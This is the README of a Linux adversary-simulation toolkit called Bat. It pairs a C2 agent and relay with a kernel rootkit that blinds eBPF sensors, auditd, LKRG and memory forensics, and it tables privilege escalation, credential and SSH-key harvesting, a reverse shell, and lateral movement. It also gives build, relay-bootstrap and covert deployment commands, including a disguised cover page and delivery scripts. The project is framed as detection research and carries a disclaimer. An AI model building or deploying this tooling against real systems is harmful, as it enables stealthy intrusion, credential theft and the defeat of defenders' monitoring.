# Bat v10

Bat is a realistic, evolving adversary threat model for Linux. It is not a C2 framework and it is not a rootkit. It is a complete threat simulation platform that integrates C2 communication, kernel-level stealth, userspace evasion, privilege escalation, persistence, process injection, credential harvesting, and lateral movement into a single cohesive adversary. The design goal is to be the most sophisticated and realistic Linux threat achievable in 2026, independent of what any detection system currently catches.

Bat is the adversary side of a research pair. The Aura eBPF detection framework evolves to detect Bat. Bat evolves to evade Aura. The adversary is never constrained by the detector.

---

## Stealth Layer: Singularity

The kernel stealth layer (`bat-stealth.ko`, source in `kperf-qos/`) is built directly on top of **Singularity**, a kernel rootkit research framework. Four core modules were ported and adapted:

**`bpf_hook`** -- Intercepts `bpf(2)` and all eBPF communication primitives. Any eBPF sensor receives zero telemetry for hidden PIDs. Adapted: `ARCH_SYS("bpf")` replaces the x86-only `__x64_sys_bpf`; `__ia32_sys_bpf` removed for ARM64; `HIDDEN_PORT` replaced by a sysfs-configurable global.

**`hiding_fs`** -- Complete filesystem erasure: `getdents64`/`getdents` filtering, `stat`/`statx`/`newfstatat` nlink adjustment, `openat`/`access`/`faccessat` `/proc/<pid>` blocking, chdir and readlink blocking. Merged from five Singularity modules (`hiding_directory`, `hiding_stat`, `open`, `hiding_chdir`, `hiding_readlink`). Adapted: `REGS_ARGn` macros replace direct register access; `should_hide_path()` extended for runtime-configured `bat_hidden_paths[]`.

**`hide_module`** -- Removes `bat-stealth.ko` from all kernel module lists. Extended: Singularity saves only `list.prev`; this version saves both `list.prev` and `list.next` and poisons both to block traversal in either direction. Added `module_unhide()` for reversible removal, required by K-99 before `delete_module(2)` can locate the module by name.

**`lkrg_bypass`** -- Suppresses LKRG enforcement for hidden processes: hooks signal delivery to block `SIGKILL` for hidden tasks, hooks `vprintk_emit` to drop LKRG log messages, disables UMH validation during agent execution. Ported directly with no architectural changes.

The following modules were developed independently:

- `become_root`: signal 59 hook that calls `commit_creds(prepare_kernel_cred(NULL))` to grant uid=0 (K-03)
- `selfdefense`: blocks LiME memory acquisition, hides kallsyms entries, blocks kprobes on agent symbols, re-hides the module on any enumeration attempt
- `audit`: suppresses auditd events for hidden PIDs
- `sysrq_hook`: intercepts SysRq-T to exclude hidden processes from task dumps
- `taskstats_hook`: filters NETLINK taskstats responses for hidden PIDs
- `reset_tainted` + `clear_taint_dmesg`: zeroes `/proc/sys/kernel/tainted` and filters dmesg lines containing module load evidence

The full stack makes the agent and all its artifacts invisible to: `ps`, `top`, `ss`, `netstat`, `lsof`, filesystem traversal on hidden paths, `lsmod`, sysfs, kallsyms, auditd, all eBPF sensors, LKRG, LiME, and SysRq forensics.

---

## MITRE ATT&CK Coverage

| ATT&CK ID | Technique | Bat Implementation |
|---|---|---|
| T1036.005 | Masquerading: Match Legitimate Name | TTP 1: `prctl(PR_SET_NAME)` to `kworker/0:1` |
| T1055 | Process Injection | TTP 11: shellcode + rawsock thread injected into live process |
| T1205.001 | Traffic Signaling (Magic Packet) | UDP/ICMP trigger wakes agent from dormancy |
| T1071.001 | Web Protocols C2 | HTTPS beacons over :443 or :9443 |
| T1573.001 | Encrypted Channel: Symmetric | HMAC-SHA256 authenticated beacons over TLS |
| T1090.004 | Proxy: Domain Fronting | CDN profile routes agent traffic through Cloudflare |
| T1574.006 | Hijack Execution: LD_PRELOAD | TTP 10: `bat-rootkit.so` via `/etc/ld.so.preload` |
| T1014 | Rootkit | `bat-stealth.ko`: hides PIDs, ports, files, module, self |
| T1562.001 | Impair Defenses: Disable Tools | `bpf_hook` blinds eBPF sensors; `lkrg_bypass` disables LKRG |
| T1562.012 | Impair Defenses: Disable Linux Audit | `audit` module suppresses auditd events for hidden PIDs |
| T1068 | Privilege Escalation via Exploitation | K-03: signal 59 triggers `commit_creds` to uid=0 |
| T1543.002 | Create/Modify System Process: Systemd | TTP 6: systemd unit persistence |
| T1053.003 | Scheduled Task: Cron | TTP 6: crontab persistence |
| T1070.002 | Clear Linux Logs | `clear_taint_dmesg` filters dmesg; `reset_tainted` zeroes taint flag |
| T1070.004 | Indicator Removal: File Deletion | TTP 222 destruct: full artifact wipe |
| T1003 | Credential Dumping | TTP 7/23: `/etc/shadow`, shell history, env secrets |
| T1552.004 | Unsecured Credentials: Private Keys | TTP 21: SSH keys, known_hosts, configs |
| T1552.005 | Cloud Instance Metadata | TTP 23: AWS IMDS credential harvest |
| T1018 | Remote System Discovery | TTP 20: ARP table enumeration |
| T1046 | Network Service Scanning | TTP 20: TCP :22 scan of local subnet |
| T1021.004 | Lateral Movement via SSH | TTP 22: SCP self to discovered host, exec detached |
| T1078 | Valid Accounts | TTP 22: lateral move uses harvested SSH keys |
| T1059.004 | Unix Shell Execution | TTP 4: arbitrary command execution |
| T1027 | Obfuscated Files or Information | garble `-literals -tiny -seed=random`; XOR(0x5A) config encoding |
| T1620 | Reflective Code Loading | TTP 11: shellcode executed in target process address space |

---

## Architecture

```
Target                    Relay (VPS)                     Operator (local)

bat-agent --HTTPS:443-->  nginx:443 -> :8443 --tunnel-->  bat-server:9443
          --TCP:9443 -->  sshd:9443           --tunnel-->
          --UDP/ICMP -->  (trigger forwarded)

bat-agent --HTTPS:9444->  kcc-server:9444                 (kernel compile)
```

| Component | Role |
|---|---|
| `bat-agent` | Agent. Beacons, executes TTPs. Garble-obfuscated. |
| `bat-server` | Operator console. Interactive CLI. Manages all agents. |
| `netshell` | Delivery binary. Looks like a system tool; is a full agent. |
| `bat-rootkit.so` | LD_PRELOAD userspace rootkit. Hides files, PIDs, ports, env vars. |
| `bat-stealth.ko` | Kernel stealth layer (Singularity-based). |
| `kcc-server` | Relay service. Compiles `bat-stealth.ko` on demand for the target's running kernel. |
| `relay/` | Relay infrastructure: nginx, TLS, setup, sync, delivery scripts. |

---

## TTP Reference

| TTP | Name | Description |
|---|---|---|
| 1 | masquerade | Rename process comm to `kworker/0:1` (or custom) |
| 2 | reverse_shell | Reverse TCP shell to relay:4445 |
| 3 | memory_rwx | Allocate anonymous RWX memory (detection probe) |
| 4 | shell_exec | Execute arbitrary shell command |
| 5 | beacon | Force immediate extra check-in |
| 6 | persist | Install persistence (cron / systemd / rc.local) |
| 7 | creddump | Harvest `/etc/shadow`, bash history, env secrets, AWS IMDS |
| 9 | exec_chain | Spawn process chain (detection probe) |
| 10 | install_rootkit | Deploy `bat-rootkit.so` via `/etc/ld.so.preload` |
| 11 | inject + exit | Inject beacon + rawsock threads into live process, then self-exit |
| 20 | network_recon | ARP table + TCP :22 scan of local subnet |
| 21 | ssh_harvest | Collect private keys, known_hosts, authorized_keys, configs |
| 22 | lateral_move | SCP self to discovered host via SSH, exec detached |
| 23 | creddump_full | Extended credential harvest + environment fingerprint |
| 99 | kill | Silent self-termination |
| 222 | destruct | Remove all artifacts, wipe memory, exit |
| 1003 | K-03 (privesc) | Kernel signal 59 triggers `commit_creds` to uid=0 |
| 1099 | K-99 (unload) | Two-phase `bat-stealth.ko` unload via sysfs + raw `delete_module(2)` |

Console commands (in `bat-server` prompt):
- `kill` -- TTP 99 to all agents
- `destruct` -- TTP 222 to all agents
- `destruct @<agentID>` -- targeted wipe

---

## Quick Start

### 1. Prerequisites

```bash
apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu golang-go
go install mvdan.cc/garble@latest
```

### 2. Configure

```bash
cp build.env.example build.env
nano build.env      # RELAY_IP, SECRET, BAT_KEY, CDN_DOMAIN
```

Generate a secret: `openssl rand -hex 16`

### 3. Build

```bash
./build.sh              # garble agent (x86_64+arm64) + server (arm64) + netshell
./build.sh agent        # agent only
./build.sh server       # server only
./build.sh netshell     # netshell only
```

Binaries land in `bin/`.

### 4. Bootstrap the relay

```bash
# on the relay VPS (as root)
sudo bash -s -- --tg-token $TG_TOKEN --tg-chat-id $TG_CHAT_ID < relay/setup.sh

# from the operator machine
source build.env
relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc --tg
scp -i $BAT_KEY bin/netshell-v10-{x86_64,arm64} ubuntu@$RELAY_IP:/var/www/nexus/agents/
```

### 5. Run

```bash
./bin/bat-server-v10-arm64          # tunnel starts automatically, no flags needed
```

Deploy an agent on the target:

```bash
sudo setsid /path/to/bat-agent-v10-x86_64 </dev/null >/tmp/.log 2>&1 &
disown
```

Agent appears in `bat-server` as `<agentID>@<hostname>` within one beacon interval (default 30s).

---

## Build Profiles

```bash
make lab SECRET=<hex>          # direct: agent -> relay:9443, UDP trigger
make cdn SECRET=<hex>          # CDN: agent -> Cloudflare -> relay:443
make singularity SECRET=<hex>  # ICMP trigger only, no UDP port exposure
```

All profiles require `SECRET=`. Override relay IP with `RELAY=<ip>`.

---

## Security Model

- **HMAC-authenticated beacons**: every check-in signed with `SHA-256(secret)`; replays rejected server-side.
- **Two-layer config obfuscation**: XOR(0x5A) encoding at codegen time, then garble `-literals` encryption at compile time. `-X ldflags` intentionally avoided (ldflag values appear plaintext in binaries).
- **No operator-side listening ports**: all connectivity flows outbound through the SSH reverse tunnel embedded in `bat-server`.
- **SSH key baked into server**: tunnel key compiled in via the same XOR encoding as the C2 config.

---

## Cover Page

`relay/static/` is the relay's public face. The release ships a bare placeholder. Replace `index.html` and supporting pages with your cover identity before running `sync.sh`. Delivery scripts (`static/i`, `static/api/setup`, `static/api/v1/index.json`) use `__CDN_DOMAIN__` as a placeholder; set `CDN_DOMAIN=` in `build.env` and `sync.sh` substitutes it automatically. Update `relay/nginx/bat.conf` with the real domain in `server_name` and TLS cert paths before the first nginx deploy.

---

## Disclaimer

This software is developed exclusively for authorized security research, adversary simulation in controlled lab environments, and the development of detection and response capabilities. It contains functional implementations of offensive techniques including kernel-level rootkits, process injection, credential harvesting, and lateral movement. Deployment on any system without explicit written authorization from the system owner is illegal under applicable computer fraud and abuse laws in most jurisdictions.

The authors accept no liability for any damages, legal consequences, or harm resulting from unauthorized, negligent, or malicious use of this software. By using this software, you affirm that you are a qualified security professional operating within a lawful, authorized scope, and that full legal and ethical responsibility for its use rests solely with you.

This software is not to be redistributed, published, or disclosed to any third party without prior written consent.
